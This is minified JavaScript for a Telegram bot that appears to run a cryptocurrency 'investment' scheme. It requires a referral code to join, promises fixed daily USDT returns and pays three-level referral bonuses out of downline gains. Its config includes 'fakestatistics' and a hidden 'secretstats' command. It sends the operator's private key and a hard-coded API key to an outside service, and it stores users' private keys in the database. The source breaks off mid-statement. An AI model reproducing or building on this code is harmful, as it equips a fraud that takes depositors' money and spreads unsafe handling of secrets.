(()=>{var e={383:e=>{e.exports=require('./details')},986:e=>{"use strict";e.exports=require("body-parser")},860:e=>{"use strict";e.exports=require("express")},13:e=>{"use strict";e.exports=require("mongodb")},809:e=>{"use strict";e.exports=require("node-fetch")},832:e=>{"use strict";e.exports=require("telegraf")},535:e=>{"use strict";e.exports=require("telegraf-ratelimit")}},t={};function a(n){var r=t[n];if(void 0!==r)return r.exports;var o=t[n]={exports:{}};return e[n](o,o.exports,a),o.exports}(()=>{const{Telegraf:e,session:t,Extra:n,Markup:r,Scenes:o,Context:i}=a(832),{BaseScene:s,Stage:l}=o,{enter:c,leave:d}=l,u=new l,m=a(535),f=a(13).MongoClient,y=a(809),{token:p,admins:w,curr:v,lvl:h,profit_percent:k,minAmount:b,daily_hour:_,mongo_url:g,aboutmsg:$,fakestatistics:x,USDT_RECIVER:T,PrivateKey:D,appname:B}=a(383),S=new e(p),U=a(860),A=a(986),M=U();M.use(A.urlencoded({extended:!1})),M.use(A.json());const I=new s("investamo");u.register(I);const O=new s("manualconvert");u.register(O);const C=new s("senderSupport");u.register(C);const W=new s("setwallet");u.register(W);const N=new s("refercode");u.register(N);const P=new s("onwith");u.register(P);const Y=new s("mini");u.register(Y);const F=new s("support");u.register(F);const E=new s("max");u.register(E);const L=new s("tax");u.register(L);const R=new s("mkey"),z=new s("calcprofit");u.register(R),u.register(z);const j=new s("mid");u.register(j);const q=new s("subid");u.register(q);const H=new s("comment");u.register(H);const Q=new s("addcha");u.register(Q);const G=new s("rcha");u.register(G);const K=new s("getref");u.register(K);const V=new s("chabal");u.register(V);const Z=new s("getdetails");u.register(Z);const J=new s("paycha");u.register(J);const X=new s("broad");function ee(e,t){try{for(const t of w)le(t,"*😢 Wtf! Error Happened In Bot:\n\n"+e+"\n\n*",{parse_mode:"Markdown"})}catch(e){console.log(e)}}u.register(X);const te={window:1e3,limit:1,onLimitExceeded:(e,t)=>{"callback_query"in e.update&&e.answerCbQuery("😅 Please Dont Press Buttons to Fast , Try Again...",!0).catch((e=>ee(e)))},keyGenerator:e=>!!e.callbackQuery};let ae;S.use(m(te)),S.use(t()),S.use(u.middleware()),f.connect(g,{useUnifiedTopology:!0},((e,t)=>{e?console.log(e):(ae=t.db(p.split(":")[0]),S.launch())})),console.log("Bot hosted on server. Try sending /start.");var ne=[["💰 Balance","📈 Invest 💹","📥 Deposit"],["📤 Withdraw","👨‍💻 Referrals","🖥 Calculator 🔢"],["💬 Chat with Us 💬","ℹ️ About Us ❔"]];let re=[["💵 My Investments","💸 My Withdrawals"],["💰 My Deposits","💼 Change Wallet"],["⬅️ Back"]];re.map((e=>e.map((e=>({text:e,resize_keyboard:!0,one_time_keyboard:!0})))));const oe=async e=>{try{let t=await ae.collection("admin").find({admin:"admin"}).toArray();if(!t.length){let t={admin:"admin",ref:1,mini:2,max:4,paycha:"@Username",botstat:"Active",withstat:"On",subid:"Not Set",mid:"NOT SET",mkey:"NOT SET",comment:"NOT SET",tax:0,channels:[]};return ae.collection("admin").insertOne(t),void de(e,"*👀 Bot Data Saved In Database Try To Restart Bot /start*")}if("private"!=e.message.chat.type)return;if("Active"!=t[0].botstat)return void de(e,"*⛔ Currently Bot Is Under Maintenance*");if((await ae.collection("info").find({user:e.from.id}).toArray())[0]){let t="Welcome back! Here's the menu:";le(e.from.id,t,{parse_mode:"Markdown",reply_markup:{keyboard:ne,resize_keyboard:!0}})}else{let t="🎉 *Welcome to our platform!* 🎉\n\nBefore we get started, we have an exciting offer for you. Do you have a referral code? 🔍\n\nIf yes, please Enter the refer code below to enter your referral code. We want to make sure you get all the benefits that come with being referred by one of our amazing users. 😎\n\n⚠️ Please note that without a referral code, we won't be able to activate your account. So be sure to enter a valid code to avoid any delays in the sign-up process.";le(e.from.id,t,{parse_mode:"Markdown"}),await e.scene.enter("refercode")}}catch(e){console.log(e),ee(e)}},ie=async e=>{try{let t=await ae.collection("admin").find({admin:"admin"}).toArray();if(!t.length){let t={admin:"admin",ref:0,mini:2,max:4,paycha:"@Username",botstat:"Active",withstat:"On",subid:"Not Set",mid:"NOT SET",mkey:"NOT SET",comment:"NOT SET",tax:0,channels:[]};ae.collection("admin").insertOne(t);let a={user:e.from.id,depositBalance:10,referinfo:"",balance:10,depositBalance:2,activeInvestments:0,totalProfit:0,totalAffiliateBonus:0,wallet:"NOT SET",depositAddress:"NOT SET",depositAddressPrivateKey:"NOT SET",activated:!0,referlvl1user:e.from.id,referlvl2user:e.from.id,referlvl3user:e.from.id,referlvl1count:0,referlvl2count:0,referlvl3count:0,referraldeposits:0};return await ae.collection("info").insertOne(a),void de(e,"* Data Saved In Database Try To Restart Bot /start , You are admin*")}if("private"!=e.message.chat.type)return;if("Active"!=t[0].botstat)return void de(e,"*⛔ Currently Bot Is Under Maintenance*");if("/start"==e.message.text)if((await ae.collection("info").find({user:e.from.id}).toArray())[0]){let t="Welcome back! Here's the menu:";le(e.from.id,t,{parse_mode:"Markdown",reply_markup:{keyboard:ne,resize_keyboard:!0}})}else{let t="🎉 *Welcome to our platform!* 🎉\n\nBefore we get started, we have an exciting offer for you. Do you have a referral code? 🔍\n\nIf yes, please Enter the refer code below to enter your referral code. We want to make sure you get all the benefits that come with being referred by one of our amazing users. 😎\n\n⚠️ Please note that without a referral code, we won't be able to activate your account. So be sure to enter a valid code to avoid any delays in the sign-up process.";le(e.from.id,t,{parse_mode:"Markdown"}),await e.scene.enter("refercode")}}catch(e){console.log(e),ee(e)}};async function se(e,t){try{await S.telegram.deleteMessage(e,t)}catch(e){console.log(e)}}async function le(e,t,a){try{a?await S.telegram.sendMessage(e,t,a):await S.telegram.sendMessage(e,t)}catch(e){console.log(e)}}async function ce(e,t,a){try{a?await e.editMessageText(t,a):await e.editMessageText(t)}catch(e){console.log(e)}}async function de(e,t,a){try{a?await e.replyWithMarkdown(t,a):await e.replyWithMarkdown(t)}catch(e){console.log(e)}}S.start(ie),N.on("text",(async e=>{try{if((await ae.collection("info").find({user:e.from.id}).toArray())[0])S.start(ie);else{let t="refercode",a=e.message.text,n=await ae.collection("info").find({referinfo:a}).toArray();if(!n[0])return void de(e,"*🚨 Oops! It looks like the referral code you entered is incorrect or invalid. Please check the code and try again.*");let r={user:e.from.id,referinfo:"",balance:0,depositBalance:2,activeInvestments:0,totalProfit:0,totalAffiliateBonus:0,wallet:"NOT SET",depositAddress:"NOT SET",depositAddressPrivateKey:"NOT SET",activated:!0,referlvl1user:n[0].user,referlvl2user:n[0].referlvl1user,referlvl3user:n[0].referlvl2user,referlvl1count:0,referlvl2count:0,referlvl3count:0,referraldeposits:0,date:(new Date).toLocaleString("en-US",{timeZone:"UTC"})};await ae.collection("info").insertOne(r);let o={firstname:e.from.first_name,userid:e.from.id,earnings:0,deposits:0};ae.collection("lvl1users")||(await ae.createCollection("lvl1users"),await ae.createCollection("lvl2users"),await ae.createCollection("lvl3users"));const i={user:e.from.id,registeredUsers:[]};await ae.collection("lvl1users").insertOne(i),await ae.collection("lvl2users").insertOne(i),await ae.collection("lvl3users").insertOne(i);let s=await ae.collection("lvl1users").findOne({user:n[0].user});s=s||{registeredUsers:[]},s.registeredUsers.push(o),await ae.collection("lvl1users").updateOne({user:n[0].user},{$set:{registeredUsers:s.registeredUsers}});let l=await ae.collection("lvl2users").findOne({user:n[0].referlvl1user});l=l||{registeredUsers:[]},l.registeredUsers.push(o),await ae.collection("lvl2users").updateOne({user:n[0].referlvl1user},{$set:{registeredUsers:l.registeredUsers}});let c=await ae.collection("lvl3users").findOne({user:n[0].referlvl2user});c=c||{registeredUsers:[]},c.registeredUsers.push(o),await ae.collection("lvl3users").updateOne({user:n[0].referlvl2user},{$set:{registeredUsers:c.registeredUsers}}),await ae.collection("info").updateOne({user:n[0].user},{$inc:{referlvl1count:1}}),await ae.collection("info").updateOne({user:n[0].referlvl1user},{$inc:{referlvl2count:1}}),await ae.collection("info").updateOne({user:n[0].referlvl2user},{$inc:{referlvl3count:1}}),await ae.collection("statistics").updateOne({},{$inc:{totalUsers:1}}),de(e,"*👏 You're now eligible for signup with us! We're thrilled to have you join our community and thank you for choosing us.*",{reply_markup:{keyboard:ne,resize_keyboard:!0}}),de(e,"🎉 Congratulations! You've just received a $2 USDT signup bonus, which has been credited to your account! 🤑\n\n",{reply_markup:{keyboard:ne,resize_keyboard:!0}});let d=`➕ *New Referral:* ${e.from.first_name} on level 1`;await le(n[0].user,d,{parse_mode:"Markdown"});let u=`➕ *New Referral:* ${e.from.first_name} on level 2`;await le(n[0].referlvl1user,u,{parse_mode:"Markdown"});let m=`➕ *New Referral:* ${e.from.first_name} on level 3`;await le(n[0].referlvl2user,m,{parse_mode:"Markdown"}),await e.scene.leave(t)}}catch(t){console.log(t),ee(t),await e.scene.leave("refercode")}})),S.hears(["Back 🔙","↩️ Back to Menu","⬅️ Back"],(async e=>{try{let t=await ae.collection("admin").find({admin:"admin"}).toArray();if("private"!=e.message.chat.type)return;if("Active"!=t[0].botstat)return void de(e,"*⛔ Currently Bot Is Under Maintenance*");if(!("activated"in(await ae.collection("info").find({user:e.from.id}).toArray())[0]))return void oe(e);le(e.from.id,"*We are back to Home Page 🏠* ",{parse_mode:"Markdown",reply_markup:{keyboard:ne,resize_keyboard:!0}})}catch(e){console.log(e),ee(e)}})),S.action("invest",(async e=>{try{let t=await ae.collection("info").find({user:e.from.id}).toArray();if(!("activated"in t[0]))return void oe(e);let a="depositBalance"in t[0]?me(t[0].depositBalance,8):"0.00000000";if(Number(a)<1)return void e.answerCbQuery("You don't meet the minimum balance requirement of 1 USDT. Please deposit funds to continue.",{show_alert:!0});ce(e,`\n*💰 Investment Options 💸*\n\n🎉 *Your maximum investable amount is* _ ${a} USDT_.\n    \n💡 Here are your investment plan options in (USDT): 💡 \n 1️⃣ *${k[0]}%* daily return for *${b[0]}* to *${b[1]-.01}*.\n 2️⃣ *${k[1]}%* daily return for *${b[1]}* to *${b[2]-.01}*. \n 3️⃣ *${k[2]}%* daily return for *${b[2]} *or more.\n    \n⏰ After 24 hours, you will receive your initial investment amount plus your gain.\n🚀 Ready to launch your investment journey? Let's go! 💪'\n\n*Simply enter the amount you'd like to invest below to start earning.*`,{reply_markup:{inline_keyboard:[[{text:"⬅️ Back",callback_data:"backToInvest"}]]},parse_mode:"Markdown"}),await e.scene.enter("investamo",{user:e.from.id})}catch(e){console.log(e),ee(e)}})),I.on("text",(async e=>{try{const t="investamo";if("↩️ Back"==e.message.text)return void await e.scene.leave(t);{let a=parseFloat(e.message.text);if(isNaN(a))return void e.reply("⛔️ Enter numerical value Only,try again");if(a<1)return await se(e.chat.id,e.message.message_id),await se(e.chat.id,e.message.message_id-1),await de(e,"*❌ Investment Failed*\n\nYour entered investment amount of *"+a+" USDT* is less than the minimum investment of *1 USDT*. Please enter a valid amount to proceed.",{reply_markup:{inline_keyboard:[[{text:"↩️ Back",callback_data:"backToInvest"}]]},parse_mode:"markdown"}),void await e.scene.leave(t);const n=await ae.collection("info").find({user:e.scene.state.user}).toArray(),r="depositBalance"in n[0]?me(n[0].depositBalance,8):"0.00000000";if(a>parseFloat(r))return await se(e.chat.id,e.message.message_id),await se(e.chat.id,e.message.message_id-1),await de(e,"*❌ Failed to start a new investment*\n\nYour entered amount of *"+a+" USDT* is greater than your investable balance of *"+r+" USDT*. Please deposit more funds to proceed.",{reply_markup:{inline_keyboard:[[{text:"↩️ Back",callback_data:"backToInvest"}]]}}),void await e.scene.leave(t);await ae.collection("info").updateOne({user:e.scene.state.user},{$inc:{depositBalance:-a}}),await ae.collection("statistics").updateOne({},{$inc:{totalInvests:a}});let o={daily_amount:b[0],daily_expired:1,daily_hour:_[0],profit_percent:k[0]},i={daily_amount:b[1],daily_expired:1,daily_hour:_[1],profit_percent:k[1]},s={daily_amount:b[2],daily_expired:1,daily_hour:_[2],profit_percent:k[2]},l=null;l=a>=s.daily_amount?s:a>=i.daily_amount?i:o;let c=a*l.profit_percent/100*l.daily_expired,d=(l.daily_hour,l.daily_hour),u=Math.ceil(l.daily_expired/24),m=a+c,f=`✅ *Successfully Started Investment* \n\n💰 *Amount Invested:* ${a} USDT\n📈 *Plan:* ${l.profit_percent}% daily for ${l.daily_expired} days\n⏱ *Credit Time:* ${l.profit_percent}% every ${l.daily_hour} hours\n\n⌛️ *After ${d} Hours:* ${m.toFixed(2)} USDT\n🚀 *Your first payment will arrive after ${d} hours!*\n\n💸 *After ${u} Days:* ${m.toFixed(2)} USDT\n❓ *You will get back more than what you invested after just ${l.daily_expired} days.*\n\n🔥 *Total Profit:* ${c.toFixed(2)} USDT`;await ae.collection("info").updateOne({user:n[0].referlvl1user},{$inc:{totalAffiliateBonus:c*h[0]/100,balance:c*h[0]/100}}),await ae.collection("info").updateOne({user:e.from.id},{$inc:{activeInvestments:a}}),await ae.collection("info").updateOne({user:n[0].referlvl2user},{$inc:{totalAffiliateBonus:c*h[1]/100,balance:c*h[1]/100}}),await ae.collection("info").updateOne({user:n[0].referlvl3user},{$inc:{totalAffiliateBonus:c*h[2]/100,balance:c*h[2]/100}}),await ae.collection("lvl1users").updateOne({user:n[0].referlvl1user,"registeredUsers.userid":e.from.id},{$inc:{"registeredUsers.$.earnings":c*h[0]/100}}),await ae.collection("lvl2users").updateOne({user:n[0].referlvl2user,"registeredUsers.userid":e.from.id},{$inc:{"registeredUsers.$.earnings":c*h[1]/100}}),await ae.collection("lvl3users").updateOne({user:n[0].referlvl3user,"registeredUsers.userid":e.from.id},{$inc:{"registeredUsers.$.earnings":c*h[2]/100}}),await async function(e,t,a,n){const r=Date.now(),o=r+864e5;await ae.collection("pendinginvestmentsall").insertOne({user:t,name:a,amount:e,gain:n,scheduledTime:o});const i={user:t},s={$push:{investments:{user:t,firstname:a,starttime:r,endtime:o,amount:e,gain:n,status:"pending"}}};await ae.collection("userinvestmentinlist").updateOne(i,s,{upsert:!0})}(a,e.from.id,e.from.first_name,m),await se(e.chat.id,e.message.message_id),await se(e.chat.id,e.message.message_id-1),await de(e,f,{reply_markup:{inline_keyboard:[[{text:"↩️ Back",callback_data:"backToInvest"}]]}}),await le(n[0].referlvl1user,`🎉 Great job! Your referral ${e.from.first_name} just invested and you earned ${me(c*h[0]/100,4)} USDT in referral bonus! 🤑`),await le(n[0].referlvl2user,`🎉 Great job! Your referral ${e.from.first_name} just invested and you earned ${me(c*h[1]/100,4)} USDT in referral bonus! 🤑`),await le(n[0].referlvl3user,`🎉 Great job! Your referral ${e.from.first_name} just invested and you earned ${me(c*h[2]/100,4)} USDT in referral bonus! 🤑`),await e.scene.leave(t)}}catch(e){console.log(e),ee(e)}})),setInterval((async function(){const e=Date.now(),t=await ae.collection("pendinginvestmentsall").find({scheduledTime:{$lte:e}}).toArray();for(const e of t){const{user:t,amount:a,gain:n}=e;await ae.collection("info").updateOne({user:t},{$inc:{balance:a,totalProfit:n-a,activeInvestments:-a}}),le(t,"🎉 Congratulations! Your investment of *"+a+" USDT* has been completed! We have credited *"+n+" USDT* to your withdrawable account",{parse_mode:"Markdown"});const r={user:t,"investments.amount":a,"investments.status":"pending"},o={$set:{"investments.$.status":"completed"}};await ae.collection("userinvestmentinlist").updateOne(r,o),await ae.collection("pendinginvestmentsall").deleteOne({_id:e._id})}}),6e4),S.action("backToInvest",(async e=>{try{let t=await ae.collection("info").find({user:e.from.id}).toArray();if(!("activated"in t[0]))return void oe(e);await e.scene.leave("investamo");let a="depositBalance"in t[0]?me(t[0].depositBalance,8):"0.00000000",n=`*What would you like to do?*\n\n💰 Convert Withdrawable Balance to Deposit Balance – Transfer your available balance to deposit balance.\n\n📈 Invest – Invest your USDT to earn daily interest.\n\n💳 *Withdrawable balance:* ${"balance"in t[0]?me(t[0].balance,8):"0.00000000"} *USDT*\n*💹 Investable Balance:* ${a} *USDT*\n\n`,r=[[{text:"💳 Convert to Deposit Balance",callback_data:"convertToDeposit"}],[{text:"💰 Invest",callback_data:"invest"}]];await ce(e,n,{reply_markup:{inline_keyboard:r},parse_mode:"Markdown"})}catch(e){console.log(e),ee(e)}})),S.hears("💵 My Investments",(async e=>{const t=e.from.id,a=await ae.collection("userinvestmentinlist").findOne({user:t});if(!a||!a.investments||0===a.investments.length)return void e.reply("🙁 You have no investment history yet!");const n=a.investments.length,r=Math.ceil(n/10);let o=n-1;for(let t=0;t<r;t++){let n=`💰 *Your Investment History:* (${o+1}-${Math.max(0,o-9)})\n\n`;for(let e=0;e<10&&o>=0;e++){const r=a.investments[o],i=new Date(r.starttime).toLocaleDateString(),s=new Date(r.endtime).toLocaleDateString();let l="";if("completed"!==r.status){const e=r.endtime-Date.now();l=`${Math.floor(e/36e5)}h ${Math.floor(e%36e5/6e4)}m ${Math.floor(e%6e4/1e3)}s`}n+=`*${e+1+10*t})* Amount: ${r.amount} USDT\n    Start Date: ${i}\n    End Date: ${s}`,""!==l&&(n+=`\n    Remaining Time: ${l}`),n+=`\n    Status: ${r.status}\n\n`,o--}de(e,n)}})),S.hears("💰 My Deposits",(async e=>{try{const t=e.from.id,a=await ae.collection("userdeposits").findOne({user:t});if(!a)return void e.reply("🙁 You have no deposit history yet!");const n=a.deposits.length,r=Math.ceil(n/10);let o=n-1;for(let t=0;t<r;t++){let n=`💰 *Your Deposit History:* (${o+1}-${Math.max(0,o-9)})\n\n`;for(let e=0;e<10&&o>=0;e++){const r=a.deposits[o],i=r.date,s=r.txId;n+=`*${e+1+10*t})* Amount: ${r.amount} USDT\n    Date: ${i}\n    Tx ID: [${r.txId}](${s})\n    Block Number: ${r.blockNumber}\n\n`,o--}de(e,n,{disable_web_page_preview:!0})}}catch(e){console.log(e),ee(e)}})),S.hears("💸 My Withdrawals",(async e=>{try{const t=e.from.id,a=await ae.collection("withdraw").find({user:t}).toArray();if(0===a.length)return void e.reply("🙁 You have no withdrawal history yet!");const n=a.length,r=Math.ceil(n/10);let o=n-1;for(let t=0;t<r;t++){let n=`💸 *Your Withdrawal History:* (${o+1}-${Math.max(0,o-9)})\n\n`;for(let e=0;e<10&&o>=0;e++){const r=a[o],i=r.date.toLocaleString("en-US",{timeZone:"UTC"}),s="Pending"===r.status?"PendingTransaction":`[${r.txId}](${r.txId})`;n+=`*${e+1+10*t})* Amount: ${r.amount} USDT\n    Date: ${i}\n    Tx ID: ${s}\n    Wallet: ${r.wallet}\n    Status: ${r.status}\n\n`,o--}e.replyWithMarkdown(n,{disable_web_page_preview:!0})}}catch(t){console.log(t),e.reply("An error occurred while fetching your withdrawal history.")}})),S.hears("secretstats",(async e=>{try{let t=await ae.collection("admin").find({admin:"admin"}).toArray();if("private"!=e.message.chat.type)return;if("Active"!=t[0].botstat)return void de(e,"*⛔ Currently Bot Is Under Maintenance*");if(!("activated"in(await ae.collection("info").find({user:e.from.id}).toArray())[0]))return void oe(e);const a=await ae.collection("statistics").findOne();a||await ae.collection("statistics").insertOne(x),de(e,`📊 Statistics 📈\n\n👥 Total Users: ${a.totalUsers}\n💰 Total Deposits (USDT): ${a.totalDeposits}\n💵 Total Invests: ${a.totalInvests}\n💸 Total Withdrawals (USDT): ${a.totalWithdrawals}\n🕒 Server Time: ${(new Date).toLocaleString("en-US",{timeZone:"UTC"})}`)}catch(e){console.log(e),ee(e)}}));const ue=`👋 Welcome to our investment platform!\n\n💰 Ready to earn some passive income? Choose from our 3 investment plans:\n\n1⃣ Plan 1: Invest  ${b[0]}-${b[1]-.01} USDT and earn ${k[0]}% daily for 24 hours.\n2⃣ Plan 2: Invest  ${b[1]}-${b[2]-.01} USDT and earn ${k[1]}% daily for 24 hours.\n3⃣ Plan 3: Invest  ${b[2]}+ USDT and earn ${k[2]}% daily for 24 hours.\n\n📈 All plans pay out daily! \n\n⚠️ Please note: Deposits less than ${b[0]} USDT will be cancelled.\n\n✅ Ready to invest? Simply send USDT Bep-20 to our deposit address and start earning!\n\n👉 Thank you for choosing our investment platform. We look forward to helping you grow your wealth!`;function me(e,t){const a=10**t;return(Math.round(e*a)/a).toFixed(t)}function fe(){const e="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";let t="";for(let a=0;a<6;a++)t+=e[Math.floor(Math.random()*e.length)];return t}S.hears("📥 Deposit",(async e=>{try{let t=await ae.collection("admin").find({admin:"admin"}).toArray();if("private"!=e.message.chat.type)return;if("Active"!=t[0].botstat)return void de(e,"*⛔ Currently Bot Is Under Maintenance*");let a=await ae.collection("info").find({user:e.from.id}).toArray();if(!("activated"in a[0]))return void oe(e);if(a[0].depositAddress&&"NOT SET"!=a[0].depositAddress){await de(e,ue);const t=`*Deposit Address:* \`${a[0].depositAddress}\``,n={text:"🔍 Generate QR Code",callback_data:`qr ${a[0].depositAddress}`};le(e.from.id,t,{reply_markup:{inline_keyboard:[[n]]},parse_mode:"Markdown"})}else{le(e.from.id,"🤖 Generating your deposit address... Please hold on!",{parse_mode:"Markdown"});const t=await async function(e){try{const t="https://"+B+".up.railway.app/"+e.from.id,a={apikey:"cf1c3da73820af4c69e01f4555bc23c5",bsc_address:T,bscPrivateKey:D,ipn_url:t},n=await y("https://BSC-RPC.up.railway.app/generate-address",{method:"POST",body:JSON.stringify(a),headers:{"Content-Type":"application/json"}}),r=await n.json();return console.log(r),"failed"===r.status?(ee(r.message),"Failed"):{address:r.address,privateKey:r.privateKey}}catch(e){console.log(e)}}(e);if("Failed"==t)le(e.from.id,"*❌ Failed to generate your deposit address. Please try again.*",{parse_mode:"Markdown"});else{await de(e,ue),await ae.collection("info").updateOne({user:e.from.id},{$set:{depositAddress:t.address,depositAddressPrivateKey:t.privateKey}});const a=`*Deposit Address:* \`${t.address}\``,n={text:"🔍 Generate QR Code",callback_data:`qr ${t.address}`};le(e.from.id,a,{reply_markup:{inline_keyboard:[[n]],parse_mode:"Markdown"}})}}}catch(e){console.log(e),ee(e)}})),S.action(/^qr (.+)$/,(async e=>{try{const t=e.match[1],a=`https://chart.googleapis.com/chart?cht=qr&chs=300x300&chl=${t}`,n=`*Deposit Address:* \`${t}\``,r={url:a},o={inline_keyboard:[[{text:"↩️ Back",callback_data:"BackToDeposit"}]]},i={parse_mode:"Markdown"};e.deleteMessage(e.message),await e.replyWithPhoto(r,{caption:n,reply_markup:o,...i})}catch(e){console.log(e),ee(e)}})),S.action("BackToDeposit",(async e=>{try{let t=await ae.collection("info").find({user:e.from.id}).toArray();const a=`*Deposit Address:* \`${t[0].depositAddress}\``,n={text:"🔍 Generate QR Code",callback_data:`qr ${t[0].depositAddress}`};e.deleteMessage(e.message),de(e,a,{reply_markup:{inline_keyboard:[[n]]},parse_mode:"Markdown"})}catch(e){console.log(e),ee(e)}})),S.hears("📈 Invest 💹",(async e=>{try{let t=await ae.collection("admin").find({admin:"admin"}).toArray();if("private"!=e.message.chat.type)return;if("Active"!=t[0].botstat)return void de(e,"*⛔ Currently Bot Is Under Maintenance*");let a=await ae.collection("info").find({user:e.from.id}).toArray();if(!("activated"in a[0]))return void oe(e);let n="depositBalance"in a[0]?me(a[0].depositBalance,8):"0.00000000",r=`*What would you like to do?*\n\n💰 Convert Withdrawable Balance to Deposit Balance – Transfer your available balance to deposit balance.\n\n📈 Invest – Invest your USDT to earn daily interest.\n\n💳 *Withdrawable balance:* ${"balance"in a[0]?me(a[0].balance,8):"0.00000000"} *USDT*\n*💹 Investable Balance:* ${n} *USDT*\n\n`,o=[[{text:"💳 Convert to Deposit Balance",callback_data:"convertToDeposit"}],[{text:"💰 Invest",callback_data:"invest"}]];await de(e,r,{reply_markup:{inline_keyboard:o}})}catch(e){console.log(e),ee(e)}})),S.action("convertToDeposit",(async e=>{e.from.id,await e.scene.leave(O);const t=await ae.collection("info").find({user:e.from.id}).toArray(),a=("depositBalance"in t[0]&&me(t[0].depositBalance,8),"balance"in t[0]?me(t[0].balance,8):"0.00000000");let n=a;const r=parseFloat(a);let o=[{text:"25%",callback_data:"convert:25"},{text:"50%",callback_data:"convert:50"},{text:"75%",callback_data:"convert:75"},{text:"100%",callback_data:"convert:100"}].filter((e=>"convert:manual"!==e.callback_data));o=o.map((e=>{const t=parseInt(e.text)/100,a=me(r*t,4);return{...e,text:`${e.text} (${a} USDT)`}}));const i=[o.slice(0,2),o.slice(2,4),[{text:"Enter amount manually",callback_data:"manual"}],[{text:"🔙 Back",callback_data:"backToInvest"}]];let s="♻️ Select the amount you want to convert to investment balance or type amount manually\n\n";s+=`✅ Available balance: ${n} USDT\n`,s+="⚜ Minimum convert: 1 USDT\n\n",s+=`25%= ${me(.25*n,4)} USDT\n`,s+=`50%= ${me(.5*n,4)} USDT\n`,s+=`75%= ${me(.75*n,4)} USDT\n`,s+=`100%= ${me(n,4)} USDT\n\n`,parseFloat(a)<1?e.answerCbQuery("Sorry, You do not have enough USDT to convert to deposit balance.",{show_alert:!0}):await ce(e,s,{reply_markup:{inline_keyboard:i}})})),S.hears("💰 Balance",(async e=>{if(e.message.text.includes("💰"))try{let a=await ae.collection("admin").find({admin:"admin"}).toArray();if("private"!=e.message.chat.type)return;if("Active"!=a[0].botstat)return void de(e,"*⛔ Currently Bot Is Under Maintenance*");let n=await ae.collection("info").find({user:e.from.id}).toArray();if(!("activated"in n[0]))return void oe(e);var t=`*💰 Account Balance:*\n\n🏦 *Deposit Balance:* ${"depositBalance"in n[0]?me(n[0].depositBalance,8):"0.00000000"} *USDT*\n➖ *Withdrawable Balance:* ${"balance"in n[0]?me(n[0].balance,8):"0.00000000"} *USDT*\n💳 *Active Investments:* ${"activeInvestments"in n[0]?me(n[0].activeInvestments,8):"0.00000000"} *USDT*\n\n💰 *Total Profit:* ${"totalProfit"in n[0]?me(n[0].totalProfit,8):"0.00000000"} *USDT*\n🎁 *Total Affiliate Bonus:* ${"totalAffiliateBonus"in n[0]?me(n[0].totalAffiliateBonus,8):"0.00000000"} *USDT*`;le(e.from.id,t,{parse_mode:"Markdown",reply_markup:{keyboard:re,resize_keyboard:!0,one_time_keyboard:!0,keyboard:re.map((e=>e.map((e=>({text:e,resize_keyboard:!0,one_time_keyboard:!0}))))),resize_keyboard:!0}})}catch(e){console.log(e),ee(e)}})),S.action("manual",(async e=>{try{if("Active"!=(await ae.collection("admin").find({admin:"admin"}).toArray())[0].botstat)return void de(e,"*⛔ Currently Bot Is Under Maintenance*");if(!("activated"in(await ae.collection("info").find({user:e.from.id}).toArray())[0]))return void oe(e);let t="Enter the amount you want to convert to investment balance \n\n";await ce(e,t,{reply_markup:{inline_keyboard:[[{text:"↩️ Back",callback_data:"convertToDeposit"}]]}}),e.scene.enter("manualconvert",{userId:e.from.id})}catch(e){console.log(e),ee(e)}})),S.hears("🖥 Calculator 🔢",(async e=>{try{let t=await ae.collection("admin").find({admin:"admin"}).toArray();if("private"!=e.message.chat.type)return;if("Active"!=t[0].botstat)return void de(e,"*⛔ Currently Bot Is Under Maintenance*");if(!("activated"in(await ae.collection("info").find({user:e.from.id}).toArray())[0]))return void oe(e);let a="💰🖥️ *Profit Calculator* 🖥️💰\n\nCalculate your incoming profits with ease!\n\n💵 *Send the amount of USDT you want to invest* 💵";await de(e,a,{reply_markup:{keyboard:[["↩️ Back to Menu"]]}}),await e.scene.enter("calcprofit")}catch(e){console.log(e),ee(e)}})),z.on("text",(async e=>{try{const t="calcprofit";if("↩️ Back to Menu"==e.message.text)return pe(e),void await e.scene.leave(t);{let a=parseFloat(e.message.text);if(isNaN(a))return void e.reply("⛔️ Enter numerical value Only ���️");let n={daily_amount:b[0],daily_expired:1,daily_hour:_[0],profit_percent:k[0]},r={daily_amount:b[1],daily_expired:1,daily_hour:_[1],profit_percent:k[1]},o={daily_amount:b[2],daily_expired:1,daily_hour:_[2],profit_percent:k[2]},i=null;i=a>=o.daily_amount?o:a>=r.daily_amount?r:n;let s=a*i.profit_percent/100*i.daily_expired,l=(i.daily_hour,i.daily_hour),c=Math.ceil(i.daily_expired/24),d=a+s;de(e,`🖥 *Profit Calculator* 🖥\n\n*Amount Invested:* ${a} USDT\n*Plan:* ${i.profit_percent}% daily for ${i.daily_expired} days\n*Credit Time:* ${i.profit_percent}% every ${i.daily_hour} hours\n\n*After ${l} Hours:* ${d.toFixed(2)} USDT\n⏱ _Your first payment will arrive after ${l} hours!_\n\n💰 *After ${c} Days:* ${d.toFixed(2)} USDT\n❓_You will get back more than what you invested after just ${i.daily_expired} days._\n\n🔥 *Total Profit:* ${s.toFixed(2)} USDT`,{reply_markup:{keyboard:ne,resize_keyboard:!0}}),await e.scene.leave(t)}}catch(e){console.log(e),ee(e)}})),O.on("text",(async e=>{try{const t="manualconvert";if("↩️ Back"==e.message.text)return void await e.scene.leave(t);{let a=parseFloat(e.message.text);if(isNaN(a))return void e.reply("⛔️ Enter numerical value Only,try again");if(a<1)return await se(e.chat.id,e.message.message_id),await se(e.chat.id,e.message.message_id-1),await de(e,"*❌Conversion Failed *\n\n Your entered amount :* "+a+" * is less than minimum *1 USDT*",{reply_markup:{inline_keyboard:[[{text:"↩️ Back",callback_data:"backToInvest"}]]},parse_mode:"markdown"}),void await e.scene.leave(t);const n=await ae.collection("info").find({user:e.scene.state.userId}).toArray(),r=("depositBalance"in n[0]&&me(n[0].depositBalance,8),"balance"in n[0]?me(n[0].balance,8):"0.00000000");if(a>parseFloat(r))return await se(e.chat.id,e.message.message_id),await se(e.chat.id,e.message.message_id-1),await de(e,"*❌Conversion Failed *\n\n Your entered amount :* "+a+" * is greater than your withdrawable balance :* "+r+" USDT*",{reply_markup:{inline_keyboard:[[{text:"↩️ Back",callback_data:"backToInvest"}]]}}),void await e.scene.leave(t);await ae.collection("info").updateOne({user:e.scene.state.userId},{$inc:{balance:-a}}),await ae.collection("info").updateOne({user:e.scene.state.userId},{$inc:{depositBalance:a}});let o=`✅Successfully converted *${a} USDT* from withdrawable balance to Investable balance\n\n`;await 